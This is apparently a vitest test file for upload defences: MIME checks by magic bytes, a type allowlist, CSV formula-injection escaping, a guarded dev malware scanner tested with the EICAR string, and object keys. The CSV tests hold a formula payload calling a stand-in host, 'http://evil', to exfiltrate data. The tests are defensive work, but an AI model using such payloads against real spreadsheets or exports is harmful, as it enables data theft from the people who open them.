import { describe, it, expect } from "vitest";
import { sniffMime, inspect, escapeCsvCell, ALLOWED_MIME_TYPES } from "./content-type";
import { PermissiveDevScanner, createScanner } from "./scanner";
import { newObjectKey } from "./object-store";

const pdf = Buffer.concat([Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37]), Buffer.alloc(64)]);
const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]);
const zip = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(64)]);

describe("content inspection (§21.2)", () => {
  it("identifies types from their magic bytes", () => {
    expect(sniffMime(pdf)).toBe("application/pdf");
    expect(sniffMime(png)).toBe("image/png");
    expect(sniffMime(Buffer.from("id,name\n1,Alpha\n"))).toBe("text/plain");
  });

  it("rejects a file whose bytes contradict its declared type", () => {
    // The interesting case is not a confused browser. It is a deliberate one.
    expect(inspect(png, "application/pdf", "invoice.pdf")).toEqual({ ok: false, reason: "CONTENT_MISMATCH" });
  });

  it("rejects a type that is not on the allowlist, whatever the bytes say", () => {
    expect(inspect(pdf, "application/x-msdownload", "setup.exe")).toEqual({ ok: false, reason: "TYPE_NOT_ALLOWED" });
  });

  it("accepts a matching pair", () => {
    expect(inspect(pdf, "application/pdf", "drawing.pdf")).toEqual({ ok: true, mime: "application/pdf" });
  });

  it("confirms office files by container plus extension, which is as far as bytes go", () => {
    const docx = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
    expect(inspect(zip, docx, "contract.docx").ok).toBe(true);
    expect(inspect(zip, docx, "contract.exe").ok).toBe(false);
  });

  it("treats csv as text, since a csv has no signature of its own", () => {
    expect(inspect(Buffer.from("a,b\n1,2\n"), "text/csv", "boq.csv").ok).toBe(true);
  });

  it("rejects bytes it cannot recognise at all", () => {
    expect(inspect(Buffer.from([0x00, 0x01, 0x02, 0x03]), "application/pdf", "x.pdf").reason).toBe("UNRECOGNISED");
  });

  it("keeps executables off the allowlist entirely", () => {
    for (const t of ["application/x-msdownload", "application/x-sh", "text/html", "image/svg+xml"]) {
      expect(ALLOWED_MIME_TYPES.has(t), t).toBe(false);
    }
  });
});

describe("CSV formula injection (§24.1)", () => {
  it("neutralises a cell that a spreadsheet would execute", () => {
    // =HYPERLINK() exfiltrating a row to a remote host is a real pattern, and
    // it would be our export carrying it.
    expect(escapeCsvCell('=HYPERLINK("http://evil","click")')).toBe('\t=HYPERLINK("http://evil","click")');
    expect(escapeCsvCell("+1234")).toBe("\t+1234");
    expect(escapeCsvCell("-1+1")).toBe("\t-1+1");
    expect(escapeCsvCell("@SUM(A1)")).toBe("\t@SUM(A1)");
  });

  it("leaves ordinary values untouched", () => {
    expect(escapeCsvCell("Concrete C25/30")).toBe("Concrete C25/30");
    expect(escapeCsvCell("1234")).toBe("1234");
  });
});

describe("the scanner driver (deviation D-3)", () => {
  it("refuses to construct in production", () => {
    const previous = process.env["NODE_ENV"];
    process.env["NODE_ENV"] = "production";
    try {
      expect(() => new PermissiveDevScanner()).toThrow(/refuses to run in production/);
    } finally {
      process.env["NODE_ENV"] = previous;
    }
  });

  it("still rejects the EICAR test file, so the rejection path is exercised", async () => {
    const scanner = new PermissiveDevScanner();
    const eicar = Buffer.from("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
    expect(await scanner.scan(eicar)).toEqual({ clean: false, signature: "Eicar-Test-Signature" });
  });

  it("passes an ordinary file", async () => {
    expect(await new PermissiveDevScanner().scan(pdf)).toEqual({ clean: true });
  });

  it("refuses an unknown driver name rather than falling back to a permissive one", () => {
    const previous = process.env["MALWARE_SCANNER"];
    process.env["MALWARE_SCANNER"] = "nonsense";
    try {
      expect(() => createScanner()).toThrow(/Unknown MALWARE_SCANNER/);
    } finally {
      if (previous === undefined) delete process.env["MALWARE_SCANNER"];
      else process.env["MALWARE_SCANNER"] = previous;
    }
  });
});

describe("object keys (§21.2)", () => {
  it("carries no tenant, name or date", () => {
    const key = newObjectKey();
    expect(key).toMatch(/^[0-9a-f]{2}\/[0-9a-f]{46}$/);
    expect(key).not.toMatch(/\d{4}-\d{2}/);
  });

  it("is unique across a large batch", () => {
    const keys = new Set(Array.from({ length: 2000 }, () => newObjectKey()));
    expect(keys.size).toBe(2000);
  });
});
